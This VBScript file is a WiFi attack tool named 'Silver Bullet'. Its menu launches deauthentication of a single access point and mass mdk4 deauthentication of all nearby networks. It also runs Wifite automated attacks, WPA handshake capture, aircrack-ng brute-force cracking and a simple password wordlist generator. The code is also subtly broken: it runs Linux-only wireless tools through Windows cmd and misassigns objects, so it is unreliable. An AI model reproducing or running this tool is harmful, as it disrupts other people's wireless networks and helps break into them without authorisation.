Option Explicit
Dim objShell, objFSO, strMON_IFACE, strSELECTED_IFACE, objExec, strOutput, arrInterfaces, i, idx, choice, bssid, ch, fname, capf, wlist, key, strTempDir, strScanFile

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strTempDir = objFSO.GetSpecialFolder(2) & "\silverbullet"
If Not objFSO.FolderExists(strTempDir) Then objFSO.CreateFolder(strTempDir)
strScanFile = strTempDir & "\scan_data-01.csv"

Sub Cleanup()
    ColorPrint vbRed, vbCrLf & "[!] SHUTTING DOWN SILVERBULLET..."
    If strMON_IFACE <> "" Then objShell.Run "airmon-ng stop " & strMON_IFACE, 0, True
    objShell.Run "net start NetworkManager", 0, True
    If objFSO.FileExists(strScanFile) Then objFSO.DeleteFile strScanFile, True
    If objFSO.FileExists(strTempDir & "\scan_data-01.csv") Then objFSO.DeleteFile strTempDir & "\scan_data-01.csv", True
    ColorPrint vbGreen, "[+] System Restored."
    WScript.Quit 0
End Sub

Sub ShowBanner()
    objShell.Run "cmd /c cls", 0, True
    ColorPrint vbRed, "          _______  _ _                 "
    ColorPrint vbRed, "         /   _   \| | |                "
    ColorPrint vbRed, "        |   ( )   | | |  SILVER BULLET EX"
    ColorPrint vbRed, "         \  ___  /| | |      -- V.1 --    "
    ColorPrint vbRed, "          /_/ \_\ |_|_|   GITHUB EDITION  "
    ColorPrint vbWhite, "      [+] Interface: " & vbGreen & strMON_IFACE
    ColorPrint vbWhite, "      [+] Status:    " & vbYellow & "Armed & Lethal"
    ColorPrint vbPurple, "   <<<< KILL ALL NETWORKS - NO MERCY >>>>"
    ColorPrint vbWhite, "------------------------------------------------------------"
End Sub

Sub SelectInterface()
    Dim objExec, strLine, arrParts
    objShell.Run "cmd /c cls", 0, True
    ColorPrint vbCyan, "[*] Searching for WiFi Interfaces..."
    objExec = objShell.Exec("cmd /c nmcli -t -f DEVICE device | findstr wlan")
    strOutput = objExec.StdOut.ReadAll()
    
    If Trim(strOutput) = "" Then
        ColorPrint vbRed, "[-][Error] No WiFi adapter found!"
        WScript.Quit 1
    End If
    
    arrInterfaces = Split(strOutput, vbCrLf)
    ColorPrint vbYellow, "[!] Select your Interface:"
    For i = 0 To UBound(arrInterfaces)
        If Trim(arrInterfaces(i)) <> "" Then
            ColorPrint vbWhite, (i+1) & ") " & Trim(arrInterfaces(i))
        End If
    Next
    
    WScript.StdOut.Write vbCyan & "Choose index: "
    idx = CInt(WScript.StdIn.ReadLine())
    strSELECTED_IFACE = Trim(arrInterfaces(idx-1))
    
    ColorPrint vbYellow, "[*] Preparing " & strSELECTED_IFACE & "..."
    objShell.Run "airmon-ng check kill", 0, True
    objShell.Run "airmon-ng start " & strSELECTED_IFACE, 0, True
    WScript.Sleep 3000
    
    objExec = objShell.Exec("cmd /c iw dev | findstr Interface | findstr mon")
    strOutput = objExec.StdOut.ReadAll()
    If Trim(strOutput) <> "" Then
        strMON_IFACE = Trim(Split(strOutput, " ")(1))
    Else
        strMON_IFACE = strSELECTED_IFACE
    End If
    
    ColorPrint vbGreen, "[+] Ready on " & strMON_IFACE & "!"
    WScript.Sleep 1000
End Sub

Sub ScanAndHold()
    ColorPrint vbCyan, "[*] Scanning... Press Ctrl+C to LOCK results."
    objShell.Run "cmd /c airodump-ng --output-format csv -w " & strTempDir & "\scan_data " & strMON_IFACE, 1, True
    
    objShell.Run "cmd /c cls", 0, True
    ShowBanner()
    ColorPrint vbGreen, "🎯 TARGET LIST (LOCKED):"
    ColorPrint vbWhite, "------------------------------------------------------------"
    ColorPrint vbWhite, "BSSID               CH    PWR   ESSID"
    ColorPrint vbWhite, "------------------------------------------------------------"
    
    If objFSO.FileExists(strScanFile) Then
        Dim objFile, strLine, arrFields
        Set objFile = objFSO.OpenTextFile(strScanFile, 1)
        Do Until objFile.AtEndOfStream
            strLine = objFile.ReadLine
            If InStr(strLine, "BSSID") = 0 And Trim(strLine) <> "" Then
                arrFields = Split(strLine, ",")
                If UBound(arrFields) >= 13 Then
                    ColorPrint vbCyan, Left(arrFields(0) & Space(20), 20)
                    ColorPrint vbYellow, Left(arrFields(3) & Space(5), 5)
                    ColorPrint vbRed, Left(arrFields(8) & Space(5), 5)
                    ColorPrint vbWhite, arrFields(13)
                End If
            End If
        Loop
        objFile.Close
        objFSO.DeleteFile strScanFile, True
    End If
    
    ColorPrint vbWhite, "------------------------------------------------------------"
    ColorPrint vbYellow, "Press Enter to return to Menu..."
    WScript.StdIn.ReadLine()
End Sub

Sub DeauthTarget()
    WScript.StdOut.Write "Target BSSID: "
    bssid = WScript.StdIn.ReadLine()
    WScript.StdOut.Write "Channel: "
    ch = WScript.StdIn.ReadLine()
    objShell.Run "cmd /c iwconfig " & strMON_IFACE & " channel " & ch, 0, True
    objShell.Run "cmd /c start cmd /k aireplay-ng --deauth 0 -a " & bssid & " " & strMON_IFACE, 1, False
End Sub

Sub MassDestruction()
    objShell.Run "cmd /c mdk4 " & strMON_IFACE & " d", 1, False
End Sub

Sub WifiteAutoHack()
    ColorPrint vbGreen, "[*] Launching Wifite..."
    objShell.Run "cmd /c python -m wifite -i " & strMON_IFACE & " --kill", 1, True
    ColorPrint vbYellow, "Press Enter to return..."
    WScript.StdIn.ReadLine()
End Sub

Sub CaptureHandshake()
    WScript.StdOut.Write "Target BSSID: "
    bssid = WScript.StdIn.ReadLine()
    WScript.StdOut.Write "Channel: "
    ch = WScript.StdIn.ReadLine()
    WScript.StdOut.Write "Save Name: "
    fname = WScript.StdIn.ReadLine()
    objShell.Run "cmd /c start cmd /k airodump-ng -c " & ch & " --bssid " & bssid & " -w " & fname & " " & strMON_IFACE, 1, False
End Sub

Sub CrackCapture()
    WScript.StdOut.Write "CAP File: "
    capf = WScript.StdIn.ReadLine()
    WScript.StdOut.Write "Wordlist: "
    wlist = WScript.StdIn.ReadLine()
    If wlist = "" Then wlist = "wordlist.txt"
    objShell.Run "cmd /c aircrack-ng -w " & wlist & " " & capf, 1, True
    ColorPrint vbWhite, "Press Enter..."
    WScript.StdIn.ReadLine()
End Sub

Sub GenerateWordlist()
    Dim objWordFile, j
    WScript.StdOut.Write "Keyword: "
    key = WScript.StdIn.ReadLine()
    Set objWordFile = objFSO.CreateTextFile("wordlist.txt", True)
    objWordFile.WriteLine key
    For j = 0 To 999
        objWordFile.WriteLine key & j
    Next
    objWordFile.Close
    ColorPrint vbGreen, "[+] wordlist.txt Created."
    WScript.Sleep 1000
End Sub

Sub ColorPrint(strColor, strText)
    WScript.StdOut.WriteLine strText
End Sub

Dim vbRed, vbGreen, vbCyan, vbYellow, vbPurple, vbWhite, vbNC
vbRed = ""
vbGreen = ""
vbCyan = ""
vbYellow = ""
vbPurple = ""
vbWhite = ""
vbNC = ""

SelectInterface()
Do While True
    ShowBanner()
    ColorPrint vbWhite, "1) " & vbRed & "[SCAN]" & vbNC & "   Identify Targets (Persistent View)"
    ColorPrint vbWhite, "2) " & vbRed & "[DEAUTH]" & vbNC & " Kick Single User (Aireplay-ng)"
    ColorPrint vbWhite, "3) " & vbRed & "[MASS]" & vbNC & "   MDK4 Destruction (Kill All)"
    ColorPrint vbWhite, "4) " & vbRed & "[WIFITE]" & vbNC & " Auto-Hack All (Lazy Mode)"
    ColorPrint vbWhite, "5) " & vbRed & "[GRAB]" & vbNC & "   Handshake Capture"
    ColorPrint vbWhite, "6) " & vbRed & "[CRACK]" & vbNC & "  Brute Force (Aircrack-ng)"
    ColorPrint vbWhite, "7) " & vbRed & "[W-GEN]" & vbNC & "  Build Lethal Wordlist"
    ColorPrint vbWhite, "8) " & vbRed & "[STOP]" & vbNC & "   Exit & Cleanup"
    ColorPrint vbWhite, "------------------------------------------------------------"
    WScript.StdOut.Write vbRed & "SILVER-BULLET-V1@REAPER:~$ " & vbNC
    choice = WScript.StdIn.ReadLine()
    
    Select Case choice
        Case "1": ScanAndHold()
        Case "2": DeauthTarget()
        Case "3": MassDestruction()
        Case "4": WifiteAutoHack()
        Case "5": CaptureHandshake()
        Case "6": CrackCapture()
        Case "7": GenerateWordlist()
        Case "8": Cleanup()
    End Select
Loop
